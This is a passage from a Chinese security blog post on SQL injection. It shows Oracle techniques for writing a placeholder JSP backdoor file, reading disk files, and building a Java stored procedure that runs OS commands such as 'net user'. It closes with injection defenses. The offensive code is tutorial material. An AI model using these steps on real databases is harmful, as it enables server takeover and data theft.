xs_file <span class="token operator">:</span><span class="token operator">=</span> utl_file<span class="token punctuation">.</span><span class="token function">fopen</span><span class="token punctuation">(</span>'<span class="token constant">XXSER_DIR</span><span class="token char">', '</span>bug<span class="token punctuation">.</span>jsp<span class="token char">', '</span><span class="token class-name">W</span>'<span class="token punctuation">)</span><span class="token punctuation">;</span> #写入米名称
utl_file<span class="token punctuation">.</span><span class="token function">put_line</span><span class="token punctuation">(</span>xs_file<span class="token punctuation">,</span><span class="token char">'木马后门'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> #写入字符串，每次写一行
utl_file<span class="token punctuation">.</span><span class="token function">put_line</span><span class="token punctuation">(</span>xs_file<span class="token punctuation">,</span><span class="token char">'木马后门2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> #写入字符串，如果只写一行，此行可以删除了
utl_file<span class="token punctuation">.</span><span class="token function">fflush</span><span class="token punctuation">(</span>xs_file<span class="token punctuation">)</span><span class="token punctuation">;</span> #刷缓冲
utl_file<span class="token punctuation">.</span><span class="token function">fclose</span><span class="token punctuation">(</span>xs_file<span class="token punctuation">)</span><span class="token punctuation">;</span> #关闭文件指针
end<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ul>
</li>
<li><p>读取磁盘文件:</p>
<ul>
<li>第一步：准备所读文件目录:  <pre class="line-numbers language-java" data-language="java"><code class="language-java">create or replace directory <span class="token constant">XXSER_DIR</span> as <span class="token char">'D:'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li>第二步：读文件:  <pre class="line-numbers language-java" data-language="java"><code class="language-java">declare
xs_file utl_file<span class="token punctuation">.</span>file_type<span class="token punctuation">;</span> #定义变量
fp_buffer <span class="token function">varchar2</span><span class="token punctuation">(</span><span class="token number">4000</span><span class="token punctuation">)</span><span class="token punctuation">;</span> #读取文件大小
begin
xs_file <span class="token operator">:</span><span class="token operator">=</span> utl_file<span class="token punctuation">.</span><span class="token function">fopen</span><span class="token punctuation">(</span>'<span class="token constant">XXSER_DIR</span><span class="token char">','</span>xxser<span class="token punctuation">.</span>jsp<span class="token char">','</span><span class="token class-name">R</span>'<span class="token punctuation">)</span><span class="token punctuation">;</span> #指定文件
utl_file<span class="token punctuation">.</span><span class="token function">get_line</span><span class="token punctuation">(</span>xs_file<span class="token punctuation">,</span>fp_buffer<span class="token punctuation">)</span><span class="token punctuation">;</span> #读取一行放到fp_buffer变量中
dbms_output<span class="token punctuation">.</span><span class="token function">put_line</span><span class="token punctuation">(</span>fp_buffer<span class="token punctuation">)</span><span class="token punctuation">;</span> #在终端输出结果
utl_file<span class="token punctuation">.</span><span class="token function">fclose</span><span class="token punctuation">(</span>xs_file<span class="token punctuation">)</span><span class="token punctuation">;</span> #关闭文件指针
end<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ul>
</li>
</ul>
<h5 id="Oracle执行系统命令"><a href="#Oracle执行系统命令" class="headerlink" title="Oracle执行系统命令:"></a>Oracle执行系统命令:</h5><ul>
<li><p>第一步：创建java执行代码包:</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">create or replace and compile java source named <span class="token string">"OSCommand"</span> as
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">OSCommand</span><span class="token punctuation">&#123;</span>
	<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token class-name">String</span> command<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    	<span class="token class-name">Process</span> pro <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    	<span class="token keyword">try</span><span class="token punctuation">&#123;</span>
        	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">windowsOrLinux</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            	pro<span class="token operator">=</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"cmd.exe /c "</span><span class="token operator">+</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span>
        	<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            	pro<span class="token operator">=</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span>
        	<span class="token punctuation">&#125;</span>
    	<span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        	<span class="token keyword">return</span> <span class="token string">"exec "</span><span class="token operator">+</span>command<span class="token operator">+</span><span class="token string">" error!"</span><span class="token punctuation">;</span>
    	<span class="token punctuation">&#125;</span>
    	<span class="token keyword">return</span> <span class="token string">"exec ok ..."</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">windowsOrLinux</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    	<span class="token class-name">String</span> os <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"os.name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    	<span class="token keyword">if</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"win"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        	<span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    	<span class="token punctuation">&#125;</span>
    	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>第二步：赋予用户java执行权限:    </p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">declare
	<span class="token class-name">SCHEMA</span> <span class="token function">varchar2</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">:</span><span class="token operator">=</span> <span class="token char">'XXSER'</span><span class="token punctuation">;</span> #用户名必须大写
begin
	dbms_java<span class="token punctuation">.</span><span class="token function">grant_permission</span><span class="token punctuation">(</span>
    	<span class="token constant">SCHEMA</span><span class="token punctuation">,</span>
    	'<span class="token constant">SYS</span><span class="token operator">:</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>FilePermission</span>'<span class="token punctuation">,</span>
    	'<span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&lt;</span>ALL FILES<span class="token punctuation">></span><span class="token punctuation">></span></span>'<span class="token punctuation">,</span>
    	'execute'
	<span class="token punctuation">)</span><span class="token punctuation">;</span>
	dbms_java<span class="token punctuation">.</span><span class="token function">grant_permission</span><span class="token punctuation">(</span>
    	<span class="token constant">SCHEMA</span><span class="token punctuation">,</span>
    	'<span class="token constant">SYS</span><span class="token operator">:</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>RuntimePermission</span>'<span class="token punctuation">,</span>
    	'writeFileDescriptor'<span class="token punctuation">,</span>
    	<span class="token char">'*'</span>
	<span class="token punctuation">)</span><span class="token punctuation">;</span>
	dbms_java<span class="token punctuation">.</span><span class="token function">grant_permission</span><span class="token punctuation">(</span>
    	<span class="token constant">SCHEMA</span><span class="token punctuation">,</span>
    	'<span class="token constant">SYS</span><span class="token operator">:</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>RuntimePermission</span>'<span class="token punctuation">,</span>
    	'readFileDescriptor'<span class="token punctuation">,</span>
    	<span class="token char">'*'</span>
	<span class="token punctuation">)</span><span class="token punctuation">;</span>
commit<span class="token punctuation">;</span>
end<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>第三步：创建函数，调用java代码:</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">create or replace function <span class="token function">osexec</span><span class="token punctuation">(</span>command in string<span class="token punctuation">)</span> <span class="token keyword">return</span> varchar2 is
language <span class="token class-name">Java</span>
name '<span class="token constant">OS</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String</span>'<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
<li><p>第四步：执行命令:</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> osexec<span class="token punctuation">(</span><span class="token string">'net user'</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ul>
<h5 id="Oracle中常见的包："><a href="#Oracle中常见的包：" class="headerlink" title="Oracle中常见的包："></a>Oracle中常见的包：</h5><table>
<thead>
<tr>
<th align="center">包名称</th>
<th align="center">包头文件</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">dbms_aleri</td>
<td align="center">dbmsalrt.sql</td>
<td align="center">异步处理数据库事件</td>
</tr>
<tr>
<td align="center">dbms_application_info</td>
<td align="center">dbmsutil.sql</td>
<td align="center">注册当前运行的应用的名称（用于性能监控）</td>
</tr>
<tr>
<td align="center">dbms_aqadm</td>
<td align="center">dbmsaqad.sql</td>
<td align="center">与高级队列选项一起使用</td>
</tr>
<tr>
<td align="center">dbms_ddl</td>
<td align="center">dbmsutil.sql</td>
<td align="center">重新编译存储子程序和包，分析数据库对象</td>
</tr>
<tr>
<td align="center">dbms_debug</td>
<td align="center">dbmspb.sql</td>
<td align="center">PL&#x2F;SQL调试器接口</td>
</tr>
<tr>
<td align="center">dbms_deffr</td>
<td align="center">dbmsdefr.sql</td>
<td align="center">远程过程调用应用的接口</td>
</tr>
<tr>
<td align="center">dbms_describe</td>
<td align="center">dbmsdesc.sql</td>
<td align="center">说明存储子程序的参数</td>
</tr>
<tr>
<td align="center">dbms_job</td>
<td align="center">dbmsjob.sql</td>
<td align="center">按指定的时间或间隔执行用户定义的作业</td>
</tr>
<tr>
<td align="center">dbms_lock</td>
<td align="center">dbmslock.sql</td>
<td align="center">管理数据库块</td>
</tr>
<tr>
<td align="center">dbms_output</td>
<td align="center">dbmsotpt.sql</td>
<td align="center">将文本行写入内存供以后提取和显示</td>
</tr>
<tr>
<td align="center">dbms_pipe</td>
<td align="center">dbmspipe.sql</td>
<td align="center">通过内存“管道”在会话之间发送并接收数据</td>
</tr>
<tr>
<td align="center">dbms_profiler</td>
<td align="center">dbmspbp.sql</td>
<td align="center">用于配置PL&#x2F;SQL脚本以鉴别瓶颈问题</td>
</tr>
<tr>
<td align="center">dbms_refresh</td>
<td align="center">dbmssnap.sql</td>
<td align="center">管理能够被同步刷新的快照组</td>
</tr>
<tr>
<td align="center">dbms_session</td>
<td align="center">dbmsutil.sql</td>
<td align="center">程序执行alter session(改变会话）语句</td>
</tr>
<tr>
<td align="center">dbms_shared_pool</td>
<td align="center">dbmspool.sql</td>
<td align="center">查看并管理共享池内容</td>
</tr>
<tr>
<td align="center">dbms_snapshot</td>
<td align="center">dbmssnap.sql</td>
<td align="center">刷新，管理快照，并清除快照日志</td>
</tr>
<tr>
<td align="center">dbms_space</td>
<td align="center">dbmsutil.sql</td>
<td align="center">获取段空间信息</td>
</tr>
<tr>
<td align="center">dbms_sql</td>
<td align="center">dbmssql.sql</td>
<td align="center">执行动态SQL和PL&#x2F;SQL</td>
</tr>
<tr>
<td align="center">dbms_system</td>
<td align="center">dbmsutil.sql</td>
<td align="center">开&#x2F;关给定会话的SQL追踪</td>
</tr>
<tr>
<td align="center">dbms_transaction</td>
<td align="center">dbmsutil.sql</td>
<td align="center">管理SQL事务</td>
</tr>
<tr>
<td align="center">dbms_utility</td>
<td align="center">dbmsutil.sql</td>
<td align="center">多种实用工具：对于一个给定的模式，重新编译存储子程序和包、分析数据库对象、格式化错误信息并调用堆栈用于显示、显示实例是否以并行服务器模式运行、以10ms间隔获取当前时间、决定数据库对象的全名、将一个PL&#x2F;SQL表转换为一个使用逗号分隔的字符串，获取数据库版本&#x2F;操作系统字符串</td>
</tr>
<tr>
<td align="center">utl_raw</td>
<td align="center">utlraw.sql</td>
<td align="center">RAW数据转化为字符串</td>
</tr>
<tr>
<td align="center">utl_file</td>
<td align="center">utlfile.sql</td>
<td align="center">读&#x2F;写基于ascii字符的操作系统文件</td>
</tr>
<tr>
<td align="center">utl_http</td>
<td align="center">utlhttp.sql</td>
<td align="center">从给定的URL得到HTML格式的主页</td>
</tr>
<tr>
<td align="center">dbms_lob</td>
<td align="center">dbmslob.sql</td>
<td align="center">管理巨型对象</td>
</tr>
</tbody></table>
<h2 id="SQL注入防御"><a href="#SQL注入防御" class="headerlink" title="SQL注入防御"></a>SQL注入防御</h2><ul>
<li><p>数据类型判断（针对数字型注入）<br>在程序中严格判断数据类型：is_numeric(),ctype_digit()等函数判断数据类型</p>
</li>
<li><p>特殊字符转义（针对字符型注入）</p>
</li>
<li><p>OWASP ESAPI（为转义哪些特殊字符提供参考，提供了专门对数据库字符编码的接口，根据不同的数据库实现了不同的编码器)</p>
</li>
<li><p>使用预编译语句：<br>注：避免使用SQL语句动态拼接的方式</p>
</li>
<li><p>框架技术:<br>注：避免使用SQL语句动态拼接的方式，最好使用参数名称或者位置绑定的方式。</p>
</li>
<li><p>存储过程:<br>注：避免使用SQL动态拼接的方式</p>
</li>
</ul>

      </div>
      <div class="post-tags-categories">
        
      </div>
      
        <div class="copyright">
  <ul class="post-copyright">
    <li class="post-copyright-author">
    <strong>作者:  </strong>txjg</a>
    </li>
    <li class="post-copyright-link">
    <strong>文章链接:  </strong>
    <a href="/2021/12/15/SQL注入/" target="_blank" title="SQL注入漏洞">https://ntexjg.github.io/2021/12/15/SQL注入/</a>
    </li>
    <li class="post-copyright-license">
      <strong>版权声明:   </strong>
      本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
      许可协议。转载请注明出处!
    </li>
  </ul>
<div>
      
    </article>
    <!-- 上一篇文章和下一篇文章 -->
    
    

    <!-- 打赏 -->
    

    <!-- 分享 -->
    
    
    <!-- 评论 -->
    <!-- 评论 -->

  <div id="myComment">
    
  </div>

<!-- comment script in themes\hexo-theme-bamboo\layout\_partial\scripts\index.ejs -->


  </div>

  <!-- 目录 -->
  <!-- 文章详情页右侧目录 -->

  <div class="toc-aside">
    <div class="toc-main">
      <div class="toc-aside-title">
        <i class="fas fa-list-ul" aria-hidden="true"></i><span>本文目录</span>
        
          <div class="toc-open-close">本文目录</div>
        
      </div>
      <div class="toc-content">
        <div class="toc"></div>
      </div>
    </div>
  </div>

  <!-- 手机端目录按钮 -->
  <div id="toc-mobile-btn">
    <i class="fas fa-list-ul" aria-hidden="true"></i>
  </div>


<script>
  function closeToc(init) {
    $(".toc-aside").css({'width': 0, 'padding': 0, 'transition': init ?  'noe' : 'width 0.3s' });
    $(".toc-content").css({'width': 0});
    $(".toc-aside-title span, .toc-aside-title i").css({'display': 'none'});
    $(".main-content").css({'width': '75%', 'margin': '10px auto'});
  };
  function openToc() {
    $(".main-content").css({'width': '65%', 'margin-right': '10px', 'margin-left': 'calc(35% - 350px)'});
    $(".toc-aside").css({'width': '300px', 'padding': '0 10px', 'transition': 'width 0.3s'});
    $(".toc-content").css({'width': '300px'});
    $(".toc-aside-title span, .toc-aside-title i").css({'display': 'inline-block'});
  }
  function openBtnClickFn () {
    let openOrCloseBtn = $('.toc-aside .toc-aside-title .toc-open-close');
    let open = eval('' || 'true');
    openOrCloseBtn.click(function() {
      if (open) {
        closeToc();
        open = false;
      } else {
        openToc();
        open = true;
      }
    });
  };
  openBtnClickFn();
  initCloseTocWidth(true);

  function initCloseTocWidth(init) {
    if (window.innerWidth >= 992) {
      let isClose = false;
      isClose && closeToc(init)
    }
  }

  document.addEventListener('pjax:complete', function () {
    $(".toc-aside").css({'transition': 'no'});
  })
  document.addEventListener('pjax:complete', function () {
    openBtnClickFn();
  })
  
</script>

  <!-- 图片放大 Wrap images with fancybox support -->
  <script src="/js/wrapImage.js"></script>
</div>

<!-- 文章详情页背景图 -->
<div id="appBgSwiper" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"
	:style="{'background-color': bgColor ? bgColor : 'transparent'}">
	<transition-group tag="ul" :name="names">
		<li v-for='(image,index) in img' :key='index' v-show="index === mark" class="bg-swiper-box">
			<img :src="image" class="bg-swiper-img no-lazy">
		</li>
	</transition-group>
</div>
<script>
	var vm = new Vue({
		el: '#appBgSwiper',
		data: {
			names: '' || 'fade' || 'fade', // translate-fade fade
			mark: 0,
			img: [],
			bgColor: '',
			time: null
		},
		methods: {   //添加方法
			change(i, m) {
				if (i > m) {
					// this.names = 'fade';
				} else if (i < m) {
					// this.names = 'fade';
				} else {
					return;
				}
				this.mark = i;
			},
			prev() {
				// this.names = 'fade';
				this.mark--;
				if (this.mark === -1) {
					this.mark = 3;
					return
				}
			},
			next() {
				// this.names = 'fade';
				this.mark++;
				if (this.mark === this.img.length) {
					this.mark = 0;
					return
				}
			},
			autoPlay() {
				// this.names = 'fade';
				this.mark++;
				if (this.mark === this.img.length) {
					this.mark = 0;
					return
				}
			},
			play() {
				let bgImgDelay = '' || '180000'
				let delay = parseInt(bgImgDelay) || 180000;
				this.time = setInterval(this.autoPlay, delay);
			},
			enter() {
				clearInterval(this.time);
			},
			leave() {
				this.play();
			}
		},
		created() {
			this.play()
		},
		beforeDestroy() {
			clearInterval(this.time);
		},
		mounted() {
			let prop = '' || '#ffffff';
			let isImg = prop.includes('.bmp') || prop.includes('.jpg') || prop.includes('.png') || prop.includes('.tif') || prop.includes('.gif') || prop.includes('.pcx') || prop.includes('.tga') || prop.includes('.exif') || prop.includes('.fpx') || prop.includes('.psd') || prop.includes('.cdr') || prop.includes('.pcd') || prop.includes('.dxf') || prop.includes('.ufo') || prop.includes('.eps') || prop.includes('.ai') || prop.includes('.raw') || prop.includes('.WMF') || prop.includes('.webp') || prop.includes('.jpeg') || prop.includes('http://') || prop.includes('https://')
			if (isImg) {
				let img = prop.split(',');
				let configRoot = '/'
				let arrImg = [];
				img.forEach(el => {
					var Expression = /http(s)?:\/\/([\w-]+\.)+[\w-]+(\/[\w- .\/?%&=]*)?/;
					var objExp = new RegExp(Expression);

					if (objExp.test(el)) {
						// http or https
						arrImg.push(el);
					} else {
						// 非http or https开头
						// 本地文件
						let firstStr = el.charAt(0);
						if (firstStr == '/') {
							el = el.substr(1); // 删除第一个字符 '/',因为 configRoot最后一个字符为 /
						}
						el = configRoot + el;
						arrImg.push(el);
					}
				})
				this.img = arrImg;
			} else {
				this.bgColor = prop;
			}
		}
	})
</script>

<style>
	.bg-swiper-box {
		position: absolute;
		display: block;
		width: 100%;
		height: 100%;
	}

	.bg-swiper-img {
		object-fit: cover;
		width: 100%;
		height: 100%;
	}
</style>




  <script>
  function loadMermaid() {
    if (document.getElementsByClassName('mermaid').length) {
      if (window.mermaidJsLoad) mermaid.init()
      else {
        loadScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(() => {
          window.mermaidJsLoad = true
          mermaid.initialize({
            theme: 'default',
          })
          if ('true') {
            mermaid.init();
          }
        })
      }
    }
  };
  document.addEventListener("DOMContentLoaded", function () {
    loadMermaid();
  })

  document.addEventListener('pjax:complete', function () {
    loadMermaid();
  })
  
</script>


      </main>
    </div>

    <!-- 页脚 -->
    
  
  <div class="footer bg-color">
    <div class="footer-main">
      
        
          <div class="link">
            
          </div>
        
      
        
          <div class="footer-copyright">
            <p>Copyright © 2019 - 2022</p>

          </div>
        
      
        
          
        
      
        
          <div class="footer-custom">
            
          </div>
        
      
    </div>
  </div>



    <!-- 渲染暗黑按钮 -->
    
    <!-- 渲染回到顶部按钮 -->
    
      <div class="goTop top-btn-color" pointer>
  <i class="fas fa-arrow-up" aria-hidden="true"></i>
</div>
<script src="/js/goTop.js"></script>

    
    <!-- 渲染左下角音乐播放器 -->
    
      <link rel="stylesheet" href="/js/aplayer/APlayer@1.10.1.min.css">
<style>
.aplayer .aplayer-lrc p {
  
  font-size: 12px;
  font-weight: 700;
  line-height: 16px !important;
}

.aplayer .aplayer-lrc p.aplayer-lrc-current {
  
  font-size: 15px;
  color: #42b983;
}


.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
  left: -66px !important;
}

.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
  left: 0px !important;
}


</style>
<meting-js  
  class=""
  server="netease"
  type="playlist"
  id="489221140"
  fixed='true'
  autoplay='false'
  theme='#42b983'
  loop='all'
  order='random'
  preload='auto'
  volume='0.7'
  list-folded='true'
>
</meting-js>

<!-- <style>
  #aplayer {
    position: fixed;
    left: 0;
    bottom: 300px;
  }
</style> -->
<script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
    

    <!-- 图片放大 -->
    
      <script src="/js/fancybox/jquery.fancybox.min.js"></script>
    

    <!-- 百度解析 -->
    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

    
    <!-- 背景彩带 -->
    

    <script src="/js/utils/index.js"></script>
    <script src="/js/app.js"></script>
    
    <!-- 文章目录所需js -->
<link href="/js/tocbot/tocbot.css" rel="stylesheet">
<script src="/js/tocbot/tocbot.min.js"></script>

<script>
  var headerEl = 'h2, h3, h4, h5, h6',  //headers 
    content = '.post-detail',//文章容器
    idArr = {};  //标题数组以确定是否增加索引id
  //add #id
  var option = {
    // Where to render the table of contents.
    tocSelector: '.toc',
    // Where to grab the headings to build the table of contents.
    contentSelector: content,
    // Which headings to grab inside of the contentSelector element.
    headingSelector: headerEl,
    scrollSmooth: true,
    scrollSmoothOffset: -80,
    headingsOffset: -($(window).height() * 0.4 - 45),
    positionFixedSelector: '.toc-main',
    positionFixedClass: 'is-position-fixed',
    fixedSidebarOffset: 'auto',
    activeLinkClass: 'is-active-link',
    // onClick: function (e) {},
  }
  if ($('.toc').length > 0) {

    $(content).children(headerEl).each(function () {
      //去除空格以及多余标点
      var headerId = $(this).text().replace(/[\s|\~|`|\!|\@|\#|\$|\%|\^|\&|\*|\(|\)|\_|\+|\=|\||\|\[|\]|\{|\}|\;|\:|\"|\'|\,|\<|\.|\>|\/|\?|\：|\，|\。]/g, '');

      headerId = headerId.toLowerCase();
      if (idArr[headerId]) {
        //id已经存在
        $(this).attr('id', headerId + '-' + idArr[headerId]);
        idArr[headerId]++;
      }
      else {
        //id未存在
        idArr[headerId] = 1;
        $(this).attr('id', headerId);
      }
    });

    document.addEventListener("DOMContentLoaded", function () {
      tocbot.init(option);
      mobileTocClick();
    });

  }

  window.tocScrollFn = function () {
    return bamboo.throttle(function () {
      findHeadPosition();
    }, 100)()
  }
  window.addEventListener('scroll', tocScrollFn);

  const findHeadPosition = function (top) {
    if ($('.toc-list').length <= 0) {
      return false;
    }
    setTimeout(() => {  // or DOMContentLoaded 
      autoScrollToc();
    }, 0);
  }

  const autoScrollToc = function () {
    const $activeItem = document.querySelector('.is-active-link');
    const $cardToc = document.querySelector('.toc-content');
    const activePosition = $activeItem.getBoundingClientRect().top
    const sidebarScrollTop = $cardToc.scrollTop
    if (activePosition > (document.documentElement.clientHeight - 100)) {
      $cardToc.scrollTop = sidebarScrollTop + 150
    }
    if (activePosition < 100) {
      $cardToc.scrollTop = sidebarScrollTop - 150
    }
  }

  document.addEventListener('pjax:send', function () {
    if ($('.toc').length) {
      tocbot.destroy();
    }
  });

  document.addEventListener('pjax:complete', function () {
    if ($('.toc').length) {
      tocbot.init(option);
      mobileTocClick();
    }
  });
  
  // 手机端toc按钮点击出现目录
  const mobileTocClick = function () {
    const $cardTocLayout = document.getElementsByClassName('toc-aside')[0];
    const $cardToc = $cardTocLayout.getElementsByClassName('toc-content')[0];
    let right = '45px';
    if (window.innerWidth >= 551 && window.innerWidth <= 992) {
      right = '100px'
    }
    const mobileToc = {
      open: () => {
        $cardTocLayout.style.cssText = 'animation: toc-open .3s; opacity: 1; right: ' + right
      },

      close: () => {
        $cardTocLayout.style.animation = 'toc-close .2s'
        setTimeout(() => {
          $cardTocLayout.style.cssText = "opacity:''; animation: ''; right: ''"
        }, 100)
      }
    }
    document.getElementById('toc-mobile-btn').addEventListener('click', () => {
      if (window.getComputedStyle($cardTocLayout).getPropertyValue('opacity') === '0') mobileToc.open()
      else mobileToc.close()
    })

    $cardToc.addEventListener('click', (e) => {
      if (window.innerWidth < 992) { // 小于992px的时候
        mobileToc.close()
      }
    })
  }
</script>

<style>
  .is-position-fixed {
    position: sticky !important;
    top: 74px;
  }

  .toc-main ul {
    counter-reset: show-list;
  }

  .toc-main ul li::before {
    content: counter(item)".";
    display: block;
    position: absolute;
    left: 12px;
    top: 0;
  }
</style> 

<!-- 设置导航背景 -->
<script>
  let setHeaderClass = () => {
    const headerMenuTransparent = true;
    if (!headerMenuTransparent) { return; }
    const nav = $('#navHeader');
    const navTop = nav.outerHeight();
    const winTop = $(window).scrollTop();
    if(winTop > navTop) {
      nav.addClass('header-bg-color');
    }
    else {
      nav.removeClass('header-bg-color');
    }
  };

  let scrollCollect = () => {
    return bamboo.throttle(function (e) {
      setHeaderClass();
    }, 200)()
  }

  let initHeaderBg = () => {
    setHeaderClass();
  }

  setHeaderClass();
  window.addEventListener('scroll', scrollCollect);

  document.addEventListener('pjax:send', function () {
    window.removeEventListener('scroll', scrollCollect)
  })
  document.addEventListener('pjax:complete', function () {
    window.addEventListener('scroll', scrollCollect);
    setHeaderClass();
  })
</script> 

<!-- 渲染issues标签里的内容 -->
<script>
  function loadIssuesJS() {
    if ($(".post-detail").find(".issues-api").length == 0) {
      return;
    } 
    loadScript('/js/issues/index.js');
  };
  $(function () {
    loadIssuesJS();
  });
  document.addEventListener('pjax:complete', function () {
    if (typeof IssuesAPI == "undefined") {
      loadIssuesJS();
    }
  })
</script>

<!-- 输入框打字特效 -->
<!-- 输入框打字特效 -->

  <script src="/js/activate-power-mode.js"></script>
  <script>
    POWERMODE.colorful = true;  // 打开随机颜色特效
    POWERMODE.shake = false;    // 关闭输入框抖动
    document.body.addEventListener('input', POWERMODE);//监听打字事件
  </script>


<!-- markdown代码一键复制功能 -->

  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/v-plugs-ayu/lib/ayu.css">
  <script src="https://cdn.jsdelivr.net/npm/v-plugs-ayu/lib/ayu.umd.min.js"></script>
  <script src="/js/clipboard/clipboard.min.js"></script>
  <div id="appCopy">
  </div>
  <script data-pjax>
    var vm = new Vue({
      el: '#appCopy',
      data: {
      },
      computed: {
      },
      mounted() {
        const that = this;
        var copy = '复制';
        /* code */
        var initCopyCode = function () {
          var copyHtml = '';
          copyHtml += '<button class="btn-copy" data-clipboard-snippet="" style="position:absolute;top:0;right:0;z-index:1;">';
          copyHtml += '<i class="fas fa-copy"></i><span>' + copy + '</span>';
          copyHtml += '</button>';
          $(".post-detail pre").not('.gutter pre').wrap("<div class='codeBox' style='position:relative;width:100%;'></div>")
          $(".post-detail pre").not('.gutter pre').before(copyHtml);
          new ClipboardJS('.btn-copy', {
            target: function (trigger) {
              return trigger.nextElementSibling;
            }
          });
        }
        initCopyCode();
        $('.btn-copy').unbind('click').bind('click', function () {
          doSomething();
        })
        $(document).unbind('keypress').bind('keypress', function (e) {
          if (e.ctrlKey && e.keyCode == 67) {
            doSomething();
          }
        })

        function doSomething() {
          that.$notify({
            title: "成功",
            content: "代码已复制，请遵守相关授权协议。",
            type: 'success'
          })
        }
      },
      methods: {
      },
      created() { }
    })
  </script>
  

<!-- 图片懒加载 -->
<script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazyload",
    threshold: 0
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
